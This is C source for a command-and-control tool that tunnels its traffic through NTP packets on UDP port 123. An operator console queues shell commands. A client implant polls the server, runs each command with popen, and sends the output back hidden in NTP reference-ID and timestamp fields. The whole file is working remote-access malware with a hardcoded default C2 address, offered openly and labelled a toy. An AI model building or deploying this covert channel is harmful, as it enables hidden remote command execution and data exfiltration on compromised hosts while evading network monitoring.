#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <netdb.h>
#include <time.h>
#include <arpa/inet.h>
#include <pthread.h>

#define PACKET_SIZE             4096

#define NTP_QUERY_CURRENT_TASK    0
#define NTP_RSP_NO_TASK           1
#define NTP_DO_SHELL_CMD          2
#define NTP_SHELL_CMD_RESULT      3

#define NTPFLAG(x,y,z) (x<<6)^(y<<3)^z
#define SLEEP_TIME              2
#define USLEEP_TIME             900


uint8_t verbose=1;
uint8_t debug=1;
uint8_t pid=0;
struct timeval timeval_new={5,0};
int sockfd;
struct sockaddr_in clt;
socklen_t len=sizeof(clt);
struct sockaddr_in addr;
struct ntp_packet{
    /*
    计算方法：
    ntp_li<<6+ntp_vn<<3+ntp_mode
    */
    uint8_t ntp_flag;
    uint8_t ntp_stratum;
    uint8_t ntp_polling;
    uint8_t ntp_precision;
    uint8_t ntp_root_delay[4];
    uint8_t ntp_root_dispersion[4];
    /*
    client(INIT)    {'\x49','\x4e','\x49','\x54'};
    server(参考源IP) {'\x72','\x76','\x07','\xa1'};
    我们将此用于C2数据包的控制位，依次：ntp_work_type id done_yet length
    */
    uint8_t ntp_reference_id[4];

    /*
    1.小数据透传只用ntp_transmit_timestamp
    2.中等数据用多位时间戳
    3.大量数据用ntp可选附加位
    */
    uint8_t ntp_reference_timestamp[8];
    uint8_t ntp_originate_timestamp[8];
    uint8_t ntp_receive_timestamp[8];
    uint8_t ntp_transmit_timestamp[8];
//avaliable_size=4*4+8*4=48
//actual(struct)_size: 48%8=0,正好还是48。请注意，如果额外定义时要考虑结构体存储空间问题。
} ;

struct ntp_packet st_ntp = {
    .ntp_flag=NTPFLAG(0,4,4),
    .ntp_stratum='\x00',
    .ntp_polling='\x0a',
    .ntp_precision='\xe8',
    .ntp_root_delay={0},
    .ntp_root_dispersion={'\x00','\x00','\x1a','\xec'},
    .ntp_reference_id={0},
    .ntp_reference_timestamp={0},
    .ntp_originate_timestamp={0},
    .ntp_receive_timestamp={0},
    .ntp_transmit_timestamp={0}
};
uint8_t current_work[48];/*for any ntp entity*/
uint8_t msg2send[48];/*for ntp client*/
uint8_t msg_received[100];/*for ntp client*/

void print_usage(){
    printf("[shell    *] : execute linux shell command on the remote device.\n");
    printf("[reset     ] : manual reset current work immediately.\n");
    //@todo
    //printf("[sessions     ] : show current alive hosts\n");
    printf("[help      ] : show these help message.\n");
}

void print_logo(){

printf("                       _           _ _ \n");
printf("       _              | |         | | |\n");
printf(" ____ | |_  ____   ___| | _   ____| | |\n");
printf("|  _ \\|  _)|  _ \\ /___) || \\ / _  ) | |\n");
printf("| | | | |__| | | |___ | | | ( (/ /| | |\n");
printf("|_| |_|\\___) ||_/(___/|_| |_|\\____)_|_|\n");
printf("           |_|                         \n");
printf("Just a toy 4 fun!             @aplyc1a  \n");
}

void write_control_bytes(uint8_t work_type,uint8_t seq_num,uint8_t done_yet,uint8_t core_payload_len,uint8_t *control_bytes){
    control_bytes[0] = work_type;
    control_bytes[1] = seq_num;
    control_bytes[2] = done_yet;
    control_bytes[3] = core_payload_len;

    return ;
}

//各调用函数需要确保sizeof(work_content)为实际有效数据的长度，不含填充的\x00.
void set_current_work(uint8_t is_server, uint8_t work_type, uint8_t seq_num, uint8_t done_yet,  uint8_t *work_content, uint8_t work_content_length){
    uint8_t control_bytes[4]={0};
    uint8_t payload[200]={0};
    memcpy(payload,work_content,work_content_length);
    //st_ntp.ntp_stratum
    //st_ntp.ntp_polling
    //st_ntp.ntp_precision
    //st_ntp.ntp_root_delay
    //st_ntp.ntp_root_dispersion
    if(is_server){
        st_ntp.ntp_flag= NTPFLAG(0,4,4);
        //core_payload_len = 24;
    }else{
        st_ntp.ntp_flag= NTPFLAG(3,4,3);
        //core_payload_len = 8;
    }
    write_control_bytes(work_type,seq_num,done_yet,work_content_length,control_bytes);
    memcpy(st_ntp.ntp_reference_id, control_bytes, 4);
    if(work_content_length<=8){
        memcpy(st_ntp.ntp_transmit_timestamp,payload,8);
    }else if(work_content_length<=24){
        memcpy(st_ntp.ntp_reference_timestamp,payload,8);
        memcpy(st_ntp.ntp_receive_timestamp,payload+8,8);
        memcpy(st_ntp.ntp_transmit_timestamp,payload+16,8);
        //ntp_originate_timestamp,ntp规定这个字段存储原来收包的时间段。如果本函数是client调用，这里可以清0.
    }else{
        //@先这么写，后面遇到大数据传输场景再说。
        memcpy(st_ntp.ntp_reference_timestamp,payload,8);
        memcpy(st_ntp.ntp_receive_timestamp,payload+8,8);
        memcpy(st_ntp.ntp_transmit_timestamp,payload+16,8);
        
    }
    memcpy(current_work,(uint8_t *)&st_ntp,sizeof(st_ntp));
}

void set_send_data(uint8_t is_server, uint8_t work_type, uint8_t seq_num, uint8_t done_yet,  uint8_t *work_content, uint8_t work_content_length){
    uint8_t control_bytes[4]={0};
    uint8_t payload[200]={0};
    memcpy(payload,work_content,work_content_length);
    //st_ntp.ntp_stratum
    //st_ntp.ntp_polling
    //st_ntp.ntp_precision
    //st_ntp.ntp_root_delay
    //st_ntp.ntp_root_dispersion
    if(is_server){
        st_ntp.ntp_flag= NTPFLAG(0,4,4);
        //core_payload_len = 24;
    }else{
        st_ntp.ntp_flag= NTPFLAG(3,4,3);
        //core_payload_len = 8;
    }
    write_control_bytes(work_type,seq_num,done_yet,work_content_length,control_bytes);
    memcpy(st_ntp.ntp_reference_id, control_bytes, 4);
    if(work_content_length<=8){
        memcpy(st_ntp.ntp_transmit_timestamp,payload,8);
    }else if(work_content_length<=24){
        memcpy(st_ntp.ntp_reference_timestamp,payload,8);
        memcpy(st_ntp.ntp_receive_timestamp,payload+8,8);
        memcpy(st_ntp.ntp_transmit_timestamp,payload+16,8);
        //ntp_originate_timestamp,ntp规定这个字段存储原来收包的时间段。如果本函数是client调用，这里可以清0.
    }else{
        //@先这么写，后面遇到大数据传输场景再说。
        memcpy(st_ntp.ntp_reference_timestamp,payload,8);
        memcpy(st_ntp.ntp_receive_timestamp,payload+8,8);
        memcpy(st_ntp.ntp_transmit_timestamp,payload+16,8);
        
    }
    memcpy(msg2send,(uint8_t *)&st_ntp,sizeof(st_ntp));
}

void reset_current_work(uint8_t is_server){
    uint8_t work_type = NTP_RSP_NO_TASK;
    uint8_t seq_num = 0;;
    uint8_t done_yet = 1;
    uint8_t core_payload_len;
    uint8_t control_bytes[4]={0};

    if(is_server){
        st_ntp.ntp_flag= NTPFLAG(0,4,4);
        core_payload_len = 24;
    }else{
        st_ntp.ntp_flag= NTPFLAG(3,4,3);
        core_payload_len = 8;
    }

    //st_ntp.ntp_stratum
    //st_ntp.ntp_polling
    //st_ntp.ntp_precision
    //st_ntp.ntp_root_delay
    //st_ntp.ntp_root_dispersion
    write_control_bytes(work_type,seq_num,done_yet,0,control_bytes);
    memcpy(st_ntp.ntp_reference_id, control_bytes, 4);
    memset(st_ntp.ntp_reference_timestamp,0,8);
    memset(st_ntp.ntp_originate_timestamp,0,8);
    memset(st_ntp.ntp_receive_timestamp,0,8);
    memset(st_ntp.ntp_transmit_timestamp,0,8);

    //st_ntp.ntp_reference_timestamp
    //st_ntp.ntp_originate_timestamp
    //st_ntp.ntp_receive_timestamp
    //st_ntp.ntp_transmit_timestamp
    memcpy(current_work,(uint8_t *)&st_ntp,sizeof(st_ntp));
}

/*server*/
void current_task_responcer(uint8_t *recvpacket, uint8_t pkt_size){
    sendto(sockfd, current_work, sizeof(current_work), 0, (struct sockaddr *)&clt, len);
}

void show_execute_result(uint8_t *recvd_packet, uint8_t recvd_len){
    uint8_t recvpacket[300];
    uint8_t recv_doneyet=1;
    uint8_t pkt_size;
    uint8_t iphdrlen;
    struct ip *ip;
    struct timeval timeval_old;
    struct timeval timeval_new={30,0};
    socklen_t length=0;
    
    uint8_t count=0;
    uint8_t payload_size=0;
    uint8_t chunk_data[200]={0};
    
    memcpy(recvpacket,recvd_packet,recvd_len);    

    recv_doneyet = recvpacket[14];
    payload_size = recvpacket[15];
    
    if(payload_size<=8){
        memcpy(chunk_data,recvpacket+40,payload_size);
    }else if(payload_size<=24){
        memcpy(chunk_data,recvpacket+16,8);
        memcpy(chunk_data+8,recvpacket+32,payload_size-8);
    }else{
        //@todo fix big-data payload in the future
    }
    chunk_data[payload_size]='\0';
    printf("\r\033[K%s",chunk_data);        
    while(!recv_doneyet){
        memset(recvpacket,0,sizeof(recvpacket));
        getsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO , &timeval_old, &length);
        setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO , &timeval_new, sizeof(struct timeval));
        pkt_size = recvfrom(sockfd,&recvpacket,sizeof(recvpacket),0,(struct sockaddr*)&clt,&len);
        setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO , &timeval_old, sizeof(struct timeval));
        recv_doneyet = recvpacket[14];
        payload_size = recvpacket[15];
        if(recv_doneyet) break;        
        if(payload_size<=8){
            memcpy(chunk_data,recvpacket+40,payload_size);
        }else if(payload_size<=24){
            memcpy(chunk_data,recvpacket+16,8);
            memcpy(chunk_data+8,recvpacket+32,payload_size-8);
        }else{
            //@todo fix big-data payload in the future
        }
        chunk_data[payload_size]='\0';
        printf("%s",chunk_data);
    }
}

void show_current_work_payload(){
    int i=0;
    while(i<48){
        printf("%c(%x) ",current_work[i],current_work[i]);
        i++;
    }
    printf("================================\n");
}

/*client*/
void check_server(uint8_t count){
    uint16_t recv_len=0;
    socklen_t length;
    struct timeval timeval_old;
    int8_t recv_pkt_size;
    set_send_data(0, NTP_QUERY_CURRENT_TASK, count, 1,  "", 0);
    sendto(sockfd,&msg2send,48,0,(struct sockaddr*)&addr,sizeof(addr));
    
    getsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO , &timeval_old, &length);
    setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO , &timeval_new, sizeof(struct timeval));
    recv_pkt_size = recvfrom(sockfd,&msg_received,sizeof(msg_received),0,(struct sockaddr*)&addr,(socklen_t*)&recv_len);    
    setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO , &timeval_old, sizeof(struct timeval));
    if (recv_pkt_size==-1) {
        if (verbose||debug) printf("Connect timeout!\n");
        exit(0);
    }
}

uint8_t query_for_current_work(uint8_t count){
    uint16_t recv_len=0;
    socklen_t length;
    struct timeval timeval_old;
    int8_t recv_pkt_size;
    uint8_t work_content[200]={0};
    set_send_data(0, NTP_QUERY_CURRENT_TASK, count, 1,  "", 0);
    sendto(sockfd,&msg2send,48,0,(struct sockaddr*)&addr,sizeof(addr));
    getsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO , &timeval_old, &length);
    setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO , &timeval_new, sizeof(struct timeval));    
    recv_pkt_size = recvfrom(sockfd,&msg_received,sizeof(msg_received),0,(struct sockaddr*)&addr,(socklen_t*)&recv_len);
    setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO , &timeval_old, sizeof(struct timeval));
    if(recv_pkt_size == -1){
        printf("query_for_current_work failure!\n");
        return 1;
    }

    if(msg_received[15]<=8){
        set_current_work(0, msg_received[12], count, 0, msg_received+40, msg_received[15]);
    }else if(msg_received[15]<=24){
        memcpy(work_content, msg_received+16,8);
        memcpy(work_content+8, msg_received+32, msg_received[15]-8);

        set_current_work(0, msg_received[12], count, 0, work_content, msg_received[15]);
        show_current_work_payload();
    }else{
        //目前保留
    }
    return 0;
}

uint8_t get_task_info(uint8_t *task_content){
    if(current_work[15]<=8){
        memcpy(task_content,current_work+40,current_work[15]);
        task_content[current_work[15]]='\0';
    }else if(msg_received[15]<=24){
        memcpy(task_content, current_work+16,8);
        memcpy(task_content+8, current_work+32, current_work[15]-8);
        task_content[current_work[15]]='\0';
    }else{
        //目前保留
    }
    return current_work[12];
}

void do_execute_task(uint8_t *shell_cmd){    
    uint8_t data2send[8]={0};//@todo这里的长度需要在后期按照可动态的方式进行调整，比如可以由命令行启动时控制
    uint8_t seq=1;
    FILE *fp = NULL;

    fp = popen(shell_cmd,"r");
    if(fp==NULL){
        if(verbose||debug) printf("\033[40;31m[-]\033[0m popen error!\n");
    }
    while(fgets(data2send,sizeof(data2send),fp)!=NULL){
        set_send_data(0, NTP_SHELL_CMD_RESULT, seq, 0,  data2send, sizeof(data2send));
        sendto(sockfd,&msg2send,48,0,(struct sockaddr*)&addr,sizeof(addr));
        seq++;
        usleep(USLEEP_TIME);
        if(verbose||debug) printf("%s",data2send);
    }
    set_send_data(0, NTP_SHELL_CMD_RESULT, seq, 1, '\x00', 0);
    sendto(sockfd,&msg2send,48,0,(struct sockaddr*)&addr,sizeof(addr));
}

void client_dispatch_work(){
    //if(verbose||debug) printf("cmd:%s\n",msg_received+iphdrlen+28);
    uint8_t task_content[200]={0};
    uint8_t work_type=0;
    work_type = get_task_info(task_content);
    if(verbose||debug) printf("msg:{%d,%s}\n",work_type,task_content);
    switch(work_type){
        case NTP_DO_SHELL_CMD:
            do_execute_task(task_content);
            break;
        case NTP_RSP_NO_TASK:
            break;
        case NTP_QUERY_CURRENT_TASK:            
        case NTP_SHELL_CMD_RESULT:
        default:
            if(verbose||debug) printf("[-]Wrong type!\n");
    }
}

void ntp_client(char *server_host){
    struct hostent *host;
    unsigned long inaddr = 0l;
    uint16_t count = 1;
    uint8_t ret=0;
    
    if((inaddr = inet_addr(server_host)) == INADDR_NONE) {
        if ((host = gethostbyname(server_host)) == NULL) {
            perror("gethostbyname error");
            exit(1);
        }
        inaddr = inet_addr(host->h_addr);
    }
    
    sockfd = socket(AF_INET,SOCK_DGRAM,0);
    //创建网络通信对象
    addr.sin_family =AF_INET;
    addr.sin_port =htons(123);
    addr.sin_addr.s_addr = inet_addr(server_host);
    addr.sin_addr.s_addr = inaddr;

    pid = getpid();
    reset_current_work(0);
    check_server(count);//@todo 内部自动重发3次
    printf("\r\033[KConnection success!\n");

    while(1){
        count++;
        reset_current_work(0);
        ret = query_for_current_work(count);
        if(ret){
            printf("Rechecking server status!\n");
            check_server(count);
        }
        client_dispatch_work();
        sleep(3);
    }
}

void *ntp_server(){
    uint8_t recvpacket[200];
    uint8_t pkt_type=0;    
    uint8_t pkt_size=0;
    int8_t ret;
    sockfd=socket(AF_INET,SOCK_DGRAM,0);
    struct sockaddr_in addr;
    addr.sin_family =AF_INET;
    addr.sin_port =htons(123);
    addr.sin_addr.s_addr=inet_addr("0.0.0.0");
    ret =bind(sockfd,(struct sockaddr*)&addr,sizeof(addr));
    if(ret<0)
    {
        printf("bind error\n");
        exit(0);
    }

    while(1)
    {
        pkt_size = recvfrom(sockfd,&recvpacket,sizeof(recvpacket),0,(struct sockaddr*)&clt,&len);
        //printf("IP: %s\n",(char*)inet_ntoa(clt.sin_addr));
        //printf("Port: %d\n",htons(clt.sin_port));
        //sendto下放到各函数内部调用，内部执行多轮交互。
        //sendto(sockfd,&buf,sizeof(buf),0,(struct sockaddr*)&clt,len);
        pkt_type=recvpacket[12];
        switch(pkt_type)
        {
            case NTP_QUERY_CURRENT_TASK://处理客户端发来的任务请求，返回当前任务信息
                if(verbose||debug) printf("\r\033[KEntering @current_task_responcer@\n");
                current_task_responcer(recvpacket, pkt_size);
                break;
            case NTP_SHELL_CMD_RESULT://处理客户端发来的shell命令执行结果。
                if(verbose||debug) printf("\r\033[KEntering @show_execute_result@\n");
                show_execute_result(recvpacket, pkt_size); 
                break;
            //@todo delete such case later
            case NTP_RSP_NO_TASK:
            case NTP_DO_SHELL_CMD:
                printf("\r\033[K\033[40;31m[-]\033[0mOooops.Received wrong type packet\n");
            default://处理正常的NTP报文及其他情况。
                if(verbose||debug) printf("\r\033[KEntering @regular_responcer@\n");
                //regular_responcer(recvpacket, pkt_size);
        }
        reset_current_work(1);
    }
    close(sockfd); 
}

void ntp_c2_main(){
    char ntpcmd[100];
    int status=0;
    pthread_t socket_thread;
    char ch;
    print_logo();
    //创建socket线程处理客户端回连过来的NTP流。
    pthread_create(&socket_thread,NULL,ntp_server,NULL);
    //pthread_join(socket_thread,NULL); //该函数用于阻塞等待线程结束
    reset_current_work(1);
    while(1){
        printf("\033[40;32mntp$>\033[0m");
        memset(ntpcmd,0,100);        
        fgets(ntpcmd,24,stdin);//@todo 当前只支持最大24字节的命令，后期进行扩展。
        setbuf(stdin,NULL);//@todo 想处理输入过长字符串导致的缓冲区残留问题，但是发现好像不起作用。@todo,CTRL-D引起异常

        //注意下面是根据输入设置当前的任务信息，存储在current_work中。client获取current_work后，server会重置当前任务。
        if(strncmp(ntpcmd,"shell ",6) == 0){
            //set_current_work(uint8_t is_server, uint8_t work_type, uint8_t seq_num, uint8_t done_yet,  uint8_t *work_content, uint8_t work_content_length)
            set_current_work(1, NTP_DO_SHELL_CMD, 1, 1, ntpcmd+6, strlen(ntpcmd+6));
        } else if ((strcmp(ntpcmd,"help\n") == 0)){
            print_usage();
        } else if (strcmp(ntpcmd,"\n") ==0){
            continue;
        } else if(strcmp(ntpcmd,"reset\n") ==0) {
            reset_current_work(1);
        } else {
            printf("\033[40;33m[!]\033[0munknow command! %3s..\n",ntpcmd);
        }
        //@todo show log message,记录会话及current_work内的信息。
        //@todo 支持显示被控端的状态。(会话是否还在。)
    }
}

int main(int argc, char *argv[]){
    //ntp-reverse
    //server: ntp -S
    //client: ntp -C -s server_addr

    int32_t opt=0;
    uint8_t server_ip[16]="192.168.199.202";
    uint8_t btn_s=0;
    uint8_t btn_c=0;
    srand(time(0));
    while((opt=getopt(argc,argv,"SChqs:"))!=-1)
    {
        switch(opt)
        {
            case 'h':
                printf("stub for show help!\n");
                printf("-C client-mode\n");
                printf("-S Server-mode\n");
                printf("-s [IP] configure c2-server address\n");
                printf("-h show usage\n");
                break;
            case 'q':
                debug=0;
                verbose=0;
                break;
            case 'C':
                btn_s=0;
                btn_c=1;
                break;
            case 's':
                strcpy(server_ip,optarg);
                break;
            case 'S':
            default:
                btn_s=1;
                btn_c=0;
        }
    }
    if((btn_s^btn_c)==0){
        exit(0);
    }
    if(btn_s){
        ntp_c2_main();
    }
    if(btn_c){
        printf("[+]Connecting...");
        ntp_client(server_ip);
    }

    return 0;
}
